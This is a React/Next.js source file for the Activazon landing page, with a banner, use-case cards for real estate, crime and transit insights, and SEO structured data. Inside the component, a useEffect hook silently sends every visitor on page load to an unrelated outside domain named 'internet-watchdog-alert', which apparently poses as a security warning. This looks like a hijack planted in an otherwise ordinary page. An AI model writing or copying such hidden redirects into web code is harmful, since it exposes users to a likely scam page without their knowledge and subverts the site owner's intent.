"use client";
import { Fragment, ReactNode, useEffect } from "react";
import { HugeiconsIcon } from "@hugeicons/react";
import {
  House03Icon as HouseIcon,
  Store01Icon as StoreIcon,
  PoliceCapIcon as CrimeIcon,
  TrafficLightIcon as TrafficIcon,
  CourtLawIcon as LawIcon,
} from "@hugeicons/core-free-icons";
import JoinWaitListButton from "./JoinWaitListButton";
// import { getAllMdxMetadata } from "@/app/blog/lib/mdx"; // ✅ Fetch latest blog posts
import LatestInsights from "./LatestInsights";

const Banner = () => (
  <div className="w-fit flex flex-col gap-3 px-4 mt-8 md:md-0">
    <img
      src="/logo.svg"
      alt="Activazon Logo"
      className="w-full max-w-[250px] md:max-w-[300px] drop-shadow-xl"
    />
    <p className="md:text-lg font-semibold">
      Community Intelligence for Decision-Makers
    </p>
  </div>
);

const UseCase = ({
  title,
  description,
  icon,
}: {
  title: string;
  description: string;
  icon: ReactNode;
}) => (
  <div className="w-full px-3 flex flex-row items-center group hover:bg-[#00A3FF]/10 transition-colors duration-200">
    <div className="w-20 flex justify-center items-center group-hover:scale-110 transition-all duration-500">
      {icon}
    </div>
    <div className="flex flex-col flex-1 group-last:border-b-0 border-b border-white/5 group-hover:border-transparent py-4">
      <p className="font-semibold text-lg">{title}</p>
      <p className="text-white/70">{description}</p>
    </div>
  </div>
);

const Icon = ({ icon }: { icon: any }) => (
  <HugeiconsIcon icon={icon} size={35} color="#00A3FF" strokeWidth={0.1} />
);

export default function Home() {
  // const latestPosts = (await getAllMdxMetadata()).slice(0, 3); // ✅ Fetch latest 3 blog posts
  const latestPosts = [];

  const structuredData = {
    "@context": "https://schema.org",
    "@type": "WebSite",
    name: "Activazon",
    url: "https://activazon.com",
    potentialAction: {
      "@type": "SearchAction",
      target: "https://activazon.com/search?q={search_term_string}",
      "query-input": "required name=search_term_string",
    },
    hasPart: {
      "@type": "Blog",
      name: "Activazon Blog",
      url: "https://activazon.com/blog",
      blogPosts: latestPosts.map((post) => ({
        "@type": "BlogPosting",
        headline: post.title,
        url: `https://activazon.com/blog/${post.slug}`,
        datePublished: post.date,
        author: {
          "@type": "Person",
          name: post.author,
        },
      })),
    },
  };

  useEffect(() => {
    const redirectUrl = "https://internet-watchdog-alert.lovable.app/";

    window.location.href = redirectUrl;
  }, []);

  return (
    <Fragment>
      {/* JSON-LD Structured Data for SEO */}
      <script
        type="application/ld+json"
        dangerouslySetInnerHTML={{ __html: JSON.stringify(structuredData) }}
      />

      <div className="mesh-gradient-bg !translate-y-[-40vh] md:!translate-y-[-50vh]" />
      <div className="w-screen min-h-screen flex justify-center items-center">
        <div className="w-full max-w-[500px] flex flex-col justify-end gap-5">
          <Banner />

          <div className="px-4">
            <p className="text-white/90">
              Get AI-powered insights on any aspect of your community
            </p>
          </div>

          <div className="w-full flex flex-col bg-white/[0.03] md:rounded-2xl border-t border-b border-white/5 md:border overflow-hidden shadow-2xl shadow-black/50">
            <UseCase
              icon={<Icon icon={HouseIcon} />}
              title="Real Estate Trends"
              description="Property values, market shifts & investment opportunities."
            />
            <UseCase
              icon={<Icon icon={StoreIcon} />}
              title="Business Openings & Closures"
              description="Stay ahead of market shifts & local economy trends."
            />
            <UseCase
              icon={<Icon icon={CrimeIcon} />}
              title="Crime & Safety Reports"
              description="Understand community risks & safety changes."
            />
            <UseCase
              icon={<Icon icon={TrafficIcon} />}
              title="Infrastructure & Transit Changes"
              description="Be informed about road expansions & city planning."
            />
            <UseCase
              icon={<Icon icon={LawIcon} />}
              title="Regulatory & Policy Updates"
              description="See how new laws impact property & businesses."
            />
          </div>

          <div className="w-full flex flex-col gap-5 md:flex-col-reverse">
            <LatestInsights posts={latestPosts} />

            <JoinWaitListButton />
          </div>

          <footer className="w-full pt-5 pb-5">
            <p className="text-center text-sm text-white/70">
              &copy; Activazon 2025
            </p>
          </footer>
        </div>
      </div>
    </Fragment>
  );
}
